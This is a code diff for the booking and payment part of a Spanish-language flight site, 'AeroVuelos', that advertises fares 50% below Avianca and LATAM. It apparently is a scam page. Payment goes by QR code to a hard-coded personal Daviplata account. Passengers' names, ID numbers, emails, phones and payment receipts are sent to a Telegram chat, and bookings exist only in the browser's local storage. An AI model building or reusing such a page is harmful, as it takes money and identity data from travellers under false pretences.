+          <span class="flight-price">${formatCOP(v.precio)}</span>
+          <div style="font-size:11px;color:#2e7d32;font-weight:600">✅ 50% menos que Avianca/LATAM</div>
+        </div>
+      </div>
+      <div class="flight-details">
+        🕐 ${v.hora} → ${v.llegada} &nbsp;|&nbsp; ⏱ ${v.duracion} &nbsp;|&nbsp; ✈️ ${v.aerolinea}
+      </div>
+    `;
+    card.onclick = () => {
+      document.querySelectorAll('.flight-card').forEach(c => c.classList.remove('selected'));
+      card.classList.add('selected');
+      selectedFlight = v;
+      document.getElementById('btnSelectFlight').style.display = 'block';
+    };
+    lista.appendChild(card);
+  });
+
+  openModal('resultsModal');
+}
+
+// ===== PAGO =====
+function openPayment() {
+  if (!currentUser && !JSON.parse(localStorage.getItem('av_currentUser') || 'null')) {
+    closeModal('resultsModal');
+    showToast('⚠️ Debes iniciar sesión para reservar', 'error');
+    setTimeout(() => openModal('loginModal'), 800);
+    return;
+  }
+  closeModal('resultsModal');
+
+  document.getElementById('precioBase').textContent = formatCOP(selectedFlight.precio);
+  document.getElementById('precioTasas').textContent = formatCOP(selectedFlight.tasas);
+  document.getElementById('precioTotal').textContent = formatCOP(selectedFlight.precio + selectedFlight.tasas);
+
+  openModal('paymentModal');
+}
+
+function selectPayment(method, el) {
+  document.querySelectorAll('.pay-method').forEach(m => m.classList.remove('selected'));
+  el.classList.add('selected');
+  selectedPayMethod = method;
+
+  document.getElementById('infoNequi').style.display         = method === 'nequi'          ? 'block' : 'none';
+  document.getElementById('infoDaviplata').style.display     = method === 'daviplata'       ? 'block' : 'none';
+  document.getElementById('infoTransferencia').style.display = method === 'transferencia'   ? 'block' : 'none';
+
+  // Generar QR con la llave brava + monto
+  if (method === 'daviplata' || method === 'transferencia') {
+    const total = selectedFlight ? selectedFlight.precio + selectedFlight.tasas : 0;
+    const qrData = `daviplata://pay?account=3203101096&key=1005753450&amount=${total}&concept=AeroVuelos`;
+    const imgId = method === 'daviplata' ? 'qrDaviplata' : 'qrTransferencia';
+    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(qrData)}&bgcolor=fff9c4&color=795548&qzone=1`;
+    document.getElementById(imgId).src = qrUrl;
+  }
+}
+
+async function confirmarPago() {
+  const nombre     = document.getElementById('pagNombre').value.trim();
+  const doc        = document.getElementById('pagDoc').value.trim();
+  const comprobante = document.getElementById('pagComprobante').value.trim();
+
+  if (!nombre || !doc) { showToast('⚠️ Completa nombre y documento', 'error'); return; }
+  if (!selectedPayMethod) { showToast('⚠️ Selecciona un método de pago', 'error'); return; }
+
+  const user = currentUser || JSON.parse(localStorage.getItem('av_currentUser') || '{}');
+  reservationCode = genCode();
+  const total = selectedFlight.precio + selectedFlight.tasas;
+
+  // Guardar reserva
+  const reservas = JSON.parse(localStorage.getItem('av_reservas') || '[]');
+  const reserva = {
+    codigo: reservationCode,
+    usuario: user,
+    vuelo: selectedFlight,
+    pasajero: { nombre, doc },
+    metodoPago: selectedPayMethod,
+    comprobante,
+    total,
+    estado: 'PENDIENTE',
+    fecha: new Date().toLocaleString('es-CO')
+  };
+  reservas.push(reserva);
+  localStorage.setItem('av_reservas', JSON.stringify(reservas));
+
+  // Mensaje Telegram
+  const methodNames = { nequi:'Nequi 💜', daviplata:'Daviplata 💛', transferencia:'Transferencia bancaria 🏦' };
+  const msg = `
+🎫 <b>NUEVA RESERVA — ${reservationCode}</b>
+━━━━━━━━━━━━━━━━━━━━
+👤 <b>Pasajero:</b> ${nombre}
+📄 <b>Documento:</b> ${doc}
+📧 <b>Email:</b> ${user.email || 'N/A'}
+📱 <b>Teléfono:</b> ${user.tel || 'N/A'}
+
+✈️ <b>Vuelo:</b> ${selectedFlight.origen} → ${selectedFlight.destino}
+🕐 <b>Hora:</b> ${selectedFlight.hora} - ${selectedFlight.llegada}
+⏱ <b>Duración:</b> ${selectedFlight.duracion}
+
+💰 <b>Total:</b> ${formatCOP(total)} COP
+💳 <b>Método:</b> ${methodNames[selectedPayMethod]}
+🧾 <b>Comprobante:</b> ${comprobante || 'Sin comprobante aún'}
+
+📅 <b>Fecha reserva:</b> ${new Date().toLocaleString('es-CO')}
+⚡ <b>Estado:</b> PENDIENTE DE CONFIRMACIÓN
+`;
+
+  await sendTelegram(msg);
+
+  closeModal('paymentModal');
+  showToast(`✅ Reserva ${reservationCode} creada! Te contactaremos pronto.`, 'success');
+}
+
+// ===== INIT =====
+window.addEventListener('load', () => {
+  updateNavUser();
+  // Set default dates
+  const today = new Date();
+  const next7 = new Date(today);
+  next7.setDate(today.getDate() + 7);
+  const next14 = new Date(today);
+  next14.setDate(today.getDate() + 14);
+  document.getElementById('fechaIda').value = next7.toISOString().split('T')[0];
+  document.getElementById('fechaVuelta').value = next14.toISOString().split('T')[0];
+});
+</script>
+</body>
+</html>
